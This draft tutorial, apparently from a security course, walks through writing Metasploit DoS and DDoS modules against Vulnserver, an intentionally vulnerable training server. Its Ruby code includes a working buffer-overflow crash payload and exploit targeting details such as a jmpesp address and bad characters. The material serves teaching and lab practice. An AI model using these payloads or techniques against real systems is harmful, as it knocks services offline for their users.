# Making-Dos-Metasploit-Module-Vulnserver
This is a walkthrough of making the DoS Metasploit module for Vulnserver a vulnerable chat server. 
## Table of Contents 
* [Introduction](#introduction)
    * [Different types of Modules](#different-types-of-modules)

* [References](#references)
## Introduction 
Metasploit modules are software written in Ruby that the Metasploit Framework uses to preform a specific task 
\([reference](https://docs.rapid7.com/metasploit/modules#:~:text=A%20module%20is%20a%20piece%20of%20software%20that%20the%20Metasploit%20Framework%20uses%20to%20perform%20a%20task%2C%20such%20as%20exploiting%20or%20scanning%20a%20target.)\).

The first thing that you should know is what the different kinds of modules are, as each one gives them different sets of functionality. What type of module you define it as also give us an idea of what it should be used for.



### Different types of Modules 
There are different types of modules. They and their characteristics are listed below. The two main modules we are concerned with are the Auxiliary and Exploit modules. This is because in our case we want to make both a DoS/DDOS and Exploit module for the vChat server. 

In the cases of our Exploit we are going to want to include a payload to gain further access to the system, so it should be an Msf::Exploit class of module. Then in the case of our DOS/DDoS module we would want it to be a Msf:Auxillary class of module as no payload is going to be used or needed.

1. **Exploit Modules**
    * They Executes a sequence of commands to target a specific vulnerability found in a system or application. 
    * They take advantage of a vulnerability to provide access to the target system. 
    * Examples include buffer overflows, code injections and web application exploits 
2. **Auxiliary Modules** 
    * They do not execute a payload
    * They can be used to perform arbitrary actions that may not be directly related to exploitation
    * Examples include scanners, fuzzers, and denial of service attacks.
3. **Post-Exploitation Modules** 
    *  Enables you to gather more information or to gain further access to an exploited target system
    * Examples include hash dumps and application and service enumerators.
4. **Payload Modules** \-***CAN BE REMOVED - all mentions of it would later need to be removed***
    * shell code that runs after an exploit successfully compromises a system.
    * enables you to define how you want to connect to the shell and what you want to do to the target system after you take control of it.
    * A payload can open a Meterpreter or command shell.
        * This command shell is an advanced payload that allows you to write DLL files to dynamically create new features as you need them.
5. **NOP-generator Module** \-***CAN BE REMOVED***
    * A NOP generator produces a series of random bytes that you can use to bypass standard IDS and IPS NOP sled signatures. Use NOP generators to pad buffers
4. [Reference](https://docs.rapid7.com/metasploit/msf-overview/#:~:text=executes%20a%20sequence%20of%20commands%20to%20target%20a%20specific%20vulnerability%20found%20in%20a%20system%20or%20application.%20An%20exploit%20module%20takes%20advantage%20of%20a%20vulnerability%20to%20provide%20access%20to%20the%20target%20system)
### Components of a Module
As mentioned earlier a module is written in Ruby. You do not need to be entirely familiar with this language to make a working module!

The first part of a module is the definition of the new module itself. If you are familiar with object oriented languages like Java or C++ then you are likely familiar with inheritance. Our new module will inherit descriptors, functions and Datastore objects. 

```ruby
class MetasploitModule < Msf::Exploit
    ...
    ...
```

Above we are defining a new MetasploitModule which inherits from the Msf::Exploit base class. If you would like to see more information on the base calls you can access it [here](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit). In place of "Msf::Exploit" you can have any of **Msf::Auxillary**, **Msf::Post**, **Msf::Nop**, and **Msf::Payload** instead.

### New Class Definition

Above we have defined a new class, but we must define components of the class, and some function that will use that class to make it useful. If you looked at the reference page for **Msf::Exploit** you may have noticed there are may characteristic of the module we can define but we will be focusing on the few necessary to describe the module and make it work.
#### Ranking
The first thing that we can include in the module is a threat ranking, there are several different rankings defined and they tell us ***how severe the exploit is*** [Cannot Access on School Wifi](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html)

There are many differnt rankings that you can chose from, they are listed below from lowest to highest.
* **ManualRanking** \- Exploit is unstable or difficult to exploit and is basically a DoS. It has a success rate of 15% or lower. This rating may be used when a module has no use unless it is specifically configured by the user.
* **LowRanking** \- Exploit is nearly impossible to exploit on common platforms with under a 50% success rate.
* **AverageRanking** \- Exploit is generally unreliable or difficult to exploit but it has a success rate of 50% or more for common platforms. 
* **NormalRanking** \- Exploit is otherwise reliable but it depends on a specific versions that is not the "common case" for a type of software. It cannot or does not reliably autodetect the target.
* **GoodRanking** \- Exploit has a default target and does not autodetect the target. It works on the "common case" of a type of software (i.e Windows 7/10/11, Windows server 2012/2016, ect.).
* **GreatRanking** \- This has a default target and will either autodetect the appropriate target or use an application-specific return address after a version check.
* **ExcellentRanking** \- This exploit will never crash the service.
* [ref - new one will not load](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking/9af9b4277da4bb5d9facbbf0c812779a9b26fc8c)


Since our module will be private, and for personal use the selected ranking does not matter all that much and we can, for simplicity select a NormalRanking.

This will result in the following module
```ruby
class MetasploitModule < Msf::Exploit
  Rank = NormalRanking	# Potential impact to the target
  ...
```
#### Mixins
Mixins are an important concept in Ruby and the Metasploit Framework. They are modules that are included inside of a class. They expand the functionality of the class with that of the module. The main thing we are concerned with in the Metasploit framework are the **Datastore** objects and functions they provide.

When creating the DoS, DDoS and Exploit modules all will use the **Msf::Exploit::Remote::Tcp** Mixin. If the module is a DOS or DDOS module it will also include the **Msf::Auxillary::Dos** module. 

The [**Msf::Exploit::Remote::Tcp**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp) Mixin will provide us with necessary TCP/IP functions to interact with  remote servers, and **Datastore** objects to control that. 

*Note that it is possible to implement this using standard Ruby TCP/IP libraries and functions.* ***REmove Space between this and above later***

The [**Msf::Auxillary::Dos**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Dos) provides DOS functionalities to the module, along with identifying the Auxiliary module specifically as a DoS module.

So we will have the following Module
```ruby
class MetasploitModule < Msf::Exploit
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# In DOS, DDOS and Exploit
  include Msf::Auxiliary::Dos       # Only in DOS and DDOS
```
#### Initialize
This is where the majority of the Module is defined, of course excluding the functions used to run it that is. This is the constructor and it sets the default values of the module.

You may notice this contains a **super** statement, that is a ruby function that will call the parent class's function of that name. 

It should before filling out the **super** function call look like  
```ruby 
class MetasploitModule < Msf::Exploit
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# In DOS, DDOS and Exploit
  include Msf::Auxiliary::Dos       # Only in DOS and DDOS
  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(...)
...
```

#### Super(update_info(...))
You may have noticed that in the above **initialize** we did not appear to do anything at all. This is because at least in our case all of the *magic* happens in the **super(update_info())** function call.

This function is where we set the  ***attributes*** of the module and those attributes are defined [here](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit#:~:text=Instance%20Attribute%20Summary) and at other parent class references. We will be using only those necessary for our new module to work and to describe the module to the users. 

We will be using the **'Name'**, **'Description'**, **'Author'**, **'License'**, **'References'**,  **'Privileged'**, and **'DisclosureDate'**. 

In the case of the Exploit module we will additionally use **'Payload'**, **'Platform'**, **'Targets'**, **'DefaultOptions'**, and **'DefaultTarget'** see [this](https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule#create-a-custom-module) for a complete view of this module.

* **'Name'** \- This is the name of the the Exploit.
* **'Description'** \- This explains what the exploit is, what it does to the target computer, and anything else that a user would need to know about the exploit.
* **'Author'** \- This is a list of the Authors of the Module/Exploit
* **'License'** \- This is the license the exploit can be distributed under ***Check***
* **'References'** \- This is a list of additional information about the attack, what was used in it creation and even proofs of concept attacks.
* **'Privileged'** \- This is whether the module grants or requires high privileges [ref](https://docs.metasploit.com/api/Msf/Module/Privileged.html).
* **'DisclosureDate'** \- This is when the exploit was disclosed.
* **'Payload'** \- This defines charicteristics about the encoded payload that will be generated and sent by the **Msf::Exploit** module. There are atriubutes that are defined in that that you will see below
    * **'Space'** \- This defines how much space the encoded payload can take up. ***Reword***
    * **'BadChars'** \- This defines characters to avoid when creating the encoded payload.
* **'Platform'** \- This defines what platforms are supported by this module.
* **'Targets'** \- This defines a list of targets and their attributes that may be used by the module. 
* **'DefaultTarget'** \- This defines the element of the **'Targets'** list to use by default 
* **'DefaultOptions'** \- This defines the defualt settings of options in the Module.

There are many other attributes that can be used, if you want to see an alternative walkthrough of this you can reference [this](https://www.offensive-security.com/metasploit-unleashed/creating-auxiliary-module/)


What we get from filling out that information in the **super(update_info(info, ...)** is the following.

In the case of the DoS/DDoS module
```ruby
class MetasploitModule < Msf::Auxiliary	
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	# This would not be in the DDoS module
  include Msf::Auxiliary::Dos

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
      'Description'    => %q{
         Vulnserver is intentionally written vulnerable. This expoits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	
...
```

In the case of the Exploit module from [this](https://github.com/xinwenfu/Malware-Analysis/tree/main/MetasploitNewModule#create-a-custom-module:~:text=to%20write%20modules.-,%23%23,-%23%20The%20%23%20symbol%20starts)
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	
      'Description'    => %q{	
         Vulnserver is intentionally written vulnerable.
      },
      'Author'         => [ 'fxw' ],	
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },      
      'Payload'        =>
        {
 #         'Space'    => 5000,	
          'BadChars' => "\x00\x0a"	
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))
```
*Notice that each attribute and sub attribute element is separated by a comma. **remember** these are arguments to a function or members or a list!* 

#### Datastore [ref](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-datastore-options/1ec0c3c29961af66ff2dc3421e7e749a06a07ee4)
This is a structure used by the Metasploit framework to configure options in the Metasploit Module. As previously mentioned, some of these Datastore objects are from Mixins but we can defined new ones as part of the new module. 

A Datastore object can have the following types. *This is an abridged description, see [this - old Link depicted](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-datastore-options/1ec0c3c29961af66ff2dc3421e7e749a06a07ee4) for more details.
* **OptAddress** \- IPv4 address.
* **OptAddressRange** \- Range of IPv4 Addresses (ex. 10.0.3.1/24)
* **OptBool** \- Stores a boolean options, True or False.
* **OptEnum** \- This stores a value from a predefined list of accepted values.
* **OptInt** \- Stores a integer value, this can either be a hex or decimal value.
* **OptPath** \- Stores a local file path
* **OptPort** \- Stores a port (socket) number, this is between 0 and 65535
* **OptRaw** \- Function is the same as OptString
* **OptRegexp** \- Stores a regular expression
* **OptString** \- Stores a string, if it begins with "**file://**" it will read from the beginning of that file to get a string.

Now that we know the available types that we can create, store or update in the module we can start defining them. **reword**

#### register_options([...])
Creating new and setting defaults of predefined Datastore objects is primarily done in the  **register_options** function.

The function when it is empty will look like the following. Notice that the arguments will be a array, which will be a comma separated list of Datastore objects to set or create.
```ruby
register_options(
  [
   ...,
   ...,
   ...
  ])
```
Setting a new default value of an already existing Datastore object, that comes from a Mixin is relatively simple. You do "**Opt::\<NAME\>(NewValue)**" where \<Name\> is the Datastore Object you want to set the value of. 

Example:
```ruby
register_options(
  [
   Opt::RPORT(9999),
   Opt::LPORT(1025),
   ...
  ])
```
If you want to create a new Datastore object the process is a bit more complected as you need to use the *constructor* of the datastore type.

#### Creating new Datastore objects [ref](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-datastore-options/1ec0c3c29961af66ff2dc3421e7e749a06a07ee4#:~:text=Core%20option-,types,-All%20core%20datastore)
When doing this you will have something like **Opt\<Type\>.new(...)** in the **register_options** function.

The constructor will have the following structure and arguments.
```ruby
Opt\<Type\>.new(option_name, [boolean, description, value, *enums*], aliases: *aliases*, conditions: *conditions*)
```
* **option_name** \- This is the name of the Datastore option, you will use it to access the value it stores
* **boolean** \- This defines whether this is a required (True) or optional (false) option
* **description** \- This is a short description of this option, often describing what it influences or does.
* **value** \- This is the default value, if the **boolean** is set to false this does not need to be set as it will automatically be *nil*. 
* **enum** \- This is a *optional* list of accepted values. Ex ["LEFT", "RIGHT", "CENTER", ...]
* **aliases** \- This is an optional array of keywords that can alternatively be used to refer to this datastore object. This is often used when renaming datastore objects to retain backwards compatibility. 
* **conditions** \- This is an array of conditions which when met will lead to the option being displayed. This is optional and is used to hid options that are irrelevant based on other configurations.
* Taken and slightly rephrased from [ref](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-datastore-options/1ec0c3c29961af66ff2dc3421e7e749a06a07ee4#:~:text=Core%20option-,types,-All%20core%20datastore)


So if we want to create a Datastore object called *ThreadNum* for the DDOS module, and redefine the *RHOST* and *RPORT* objects since we will not use the **Msf::Exploit::Remote:Tcp** mixin too. We would have the following **register_options*:
```ruby
register_options(
[
        OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]) # Sets the number of threads to use
        OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
        OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
])
```
___
### Design Choices  
This section will contain a bit of information on the defintion of the new Module's class and why some of the things were done the way they were. This will also have the **COMPLETE** module definition of the DoS and DDoS modules as code blocks.

#### DoS
The DoS module definition is almost the same as the **Msf::Exploit** Knock module. This is because it makes one connection with the functions provided by the **Msf::Exploit::Remote::Tcp** Mixin. It uses this connection to send the malicious message, the Mixin provides a few datastore objects to control those functions. Since we are only sending a message, and are not expecting a response as it will hopefully crash the server the only datastore objects we care about are *RHOST*  which is configured by the user and *RPORT*.  We assume the server is running on a know default port of 9999 so we will want to set the default value of *RPORT* to 9999.

This results in the following Module:
```ruby
# DoS
class MetasploitModule < Msf::Auxiliary	
  Rank = NormalRanking	

  include Msf::Exploit::Remote::Tcp	
  include Msf::Auxiliary::Dos

  def initialize(info = {})	
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command', 
      'Description'    => %q{
         Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
      },
      'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
      'License'        => MSF_LICENSE,
      'References'     =>	
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Mar. 30, 2022'))	
      register_options([
      	Opt::RPORT(9999)
      ])
  end
```
#### DDoS

This module is meant to create a certain number of connections to the vulnserver and this number is defined by the user. This is done to clog the vChat vulnserver and prevent other *normal* users from connecting. We do not use the **Msf::Exploit::Remote::Tcp** Mixin because the **connect** function it provides will timeout the connection. We use Ruby's socket library to get the same functionality while also defining a *RPORT* and *RHOST* datastore option to use the same conventions as modules that use the **Msf::Exploit::Remote::Tcp** Mixin.   

This results in the following Module:
```ruby
require 'socket'

class MetasploitModule < Msf::Auxiliary
    include Msf::Auxiliary::Dos 
    Rank = NormalRanking

def initialize(info = {})
    super(update_info(info, 
        'Name'           => 'Vulnserver DDoS', 
        'Description'    => %q{
            Vulnserver is intentionally written vulnerable. This exploits uses a simple buffer overflow.
        },
        'Author'         => [ 'fxw', 'GenCyber-UML-2022'], 
        'License'        => MSF_LICENSE,
        'References'     =>	
        [
            [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
        'Privileged'     => false,
        'DisclosureDate' => 'Mar. 30, 2022'))	
        register_options(
        [
            OptInt.new('ThreadNum', [ true, 'A hex or decimal', 10]), 
            OptAddress.new('RHOST', [ true, 'Set IP of Reciving Host', '127.0.0.1' ]),
            OptPort.new('RPORT', [true, 'Set Port of Reciving Host', 9999])
        ])
    end
```
### Running the Auxiliary Module
This section will be on defining the function that will run the **Msf::Auxillary** module in the Metasploit console or Arimitage application. This will be in general what the function definition looks like, and the specific cases for both the DoS and DDoS modules.

#### Msf::Auxillary
The **Msf::Auxillary** modules define a function *run*, this is where the executed code, and is the equivalent of a *main* function in C, C++ or Java. ***This is a comparison*** The body of the *run* function will contain normal Ruby code.

You can define additional function that the *run* function calls and interacts with, but we use the *run* function as the entrypoint of the program when executing the module.

The *run* function will look something like:
```ruby
def run
    ...
    ...
    # Normal Ruby code
    ...
    ...
end
```
#### DoS Module
The DoS module that is contained in the repository contains additional code to describe and show what is happening. The following will show a minimal definition of the *run* function for the DoS module.

The purpose of the DoS module is to send a specially crafted message which will exploit a buffer overflow  to crash the chat server. We will need to do the following.
1. Connect to the server.
1. Generate the malicious message.
1. Send the malicious message to the server.
*we can optionally disconnect from the server, this would only have effect if the server does not crash*

With those requirements in mind we will create the following *run* function.

```ruby 
def run
    connect # This is a function from the Msf::Exploit::Remote:Tcp Mixin that connect to the RHOST, on RPORT
    outbound = "KNOCK /.:/" + "A"*10000 # Create outbound message
    sock.put(outbound) # sends message to target

    ensure # Ensures the exploit disconnects from the server
        disconnect
    end
end
```





## References
1. [Make citation - Metasploit different modules](https://docs.rapid7.com/metasploit/msf-overview/)
1. [Make citation - Metasploit What is a module](https://docs.rapid7.com/metasploit/modules/#:~:text=A%20module%20is%20a%20piece,%2C%20or%20post%2Dexploitation%20module.)
1. [More](https://docs.metasploit.com/api/Msf/Module/Privileged.html)
1. Go through all hyperlinks and add here later.

